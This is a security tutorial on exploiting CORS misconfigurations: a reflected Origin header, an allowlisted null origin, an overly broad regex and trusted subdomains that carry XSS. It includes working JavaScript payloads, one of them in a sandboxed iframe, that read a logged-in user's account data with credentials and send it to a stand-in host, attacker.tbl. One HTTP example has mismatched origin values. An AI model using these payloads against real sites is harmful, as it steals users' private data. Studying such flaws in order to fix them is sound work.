# Exploiting common CORS configuration flaws

## Origin reflected

* Managing a list of trusted domains can be challenging, especially for applications that need to interact with many different domains.
* To make things easier, some web applications automatically allow any incoming request by taking the value of the `Origin` header and sending it back in the `Access-Control-Allow-Origin` response header without checking if it's from a trusted source.
* However, this approach can unintentionally allow unauthorized websites to access sensitive user data.
* In the following scenario, the server reflects the `Origin` header (`https://attacker.tbl`) in the `Access-Control-Allow-Origin` response header:

  ```http
  GET /api/v1/account/ HTTP/2
  Host: domain.tbl
  Cookie: session=abc123securecookie
  Origin: https://attacker.tbl
  ```

  ```http
  HTTP/2 200 OK
  Content-Type: application/json
  Access-Control-Allow-Origin: https://attacker.tbl
  Access-Control-Allow-Credentials: true

  {
    "username": "johndoe",
    "email": "john@example.tbl"
  }
  ```

* Because the user's session cookie is included and `Access-Control-Allow-Credentials` is enabled, the malicious site (`attacker.tbl`) can access the user's sensitive account data without proper authorization.
* This behavior can be exploited if the following JavaScript code is executed on the user's browser:

  ```javascript
  var req = new XMLHttpRequest(); 
  req.onload = reqListener; 
  req.open('get','https://domain.tbl/api/v1/account/',true); 
  req.withCredentials = true;
  req.send();

  // Logs the user's request on attacker's backend
  function reqListener() {
      location='//attacker.tbl/log?key='+this.responseText; 
  };
  ```

## Null origin is authorized

* When developing web applications locally, it is not uncommon for the `null` origin to be added to the whitelist of authorized origins.
* This inclusion of `null` in the whitelist can be a common practice to facilitate the development and debugging of applications on local environments.
* However, if this value keeps in the allowlist in production, an attacker can craft a request where the `Origin` value is `null`, allowing unauthorized websites to access sensitive user data:

  ```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://domain.tbl/api/v1/account/',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
      location='https://attacker.tbl/log?key='+encodeURIComponent(this.responseText);
    };
  </script>"></iframe> 
  ```

## Verification based on regular expression

* When a web application needs to support a large number of trusted origins, developers sometimes use regular expressions to simplify origin validation.
* However, if these regular expressions are too broad or poorly constructed, they can be bypassed by attackers.
* For instance, if the application uses the regular expression `.+domain\.tbl`, it will match any string that ends in `domain.tbl`, including malicious domains like `attacker-domain.tbl`:

  ```http
  GET /api/v1/account/ HTTP/2
  Host: attacker-domain.tbl
  Cookie: session=abc123securecookie
  Origin: https://attacker.tbl
  ```

  ```http
  HTTP/2 200 OK
  Content-Type: application/json
  Access-Control-Allow-Origin: https://attacker-domain.tbl
  Access-Control-Allow-Credentials: true

  {
    "username": "johndoe",
    "email": "john@example.tbl"
  }
  ```

## Attacks using vulnerable subdomains

* Web applications sometimes configure CORS to allow requests from subdomains, using patterns like `*.domain.tbl`. This is often done to enable communication between services under the same parent domain.
* However, not all subdomains are equally secure. Older, unmaintained, or less protected subdomains may contain vulnerabilities, particularly `Cross-Site Scripting (XSS)`.
* If an attacker exploits an XSS vulnerability on one of these trusted subdomains, they can execute malicious JavaScript directly in the browser of a logged-in user.
* Since the vulnerable subdomain is already trusted by the main application via CORS, the attacker's script can send cross-origin requests to the main domain and access sensitive responses using the user's credentials.
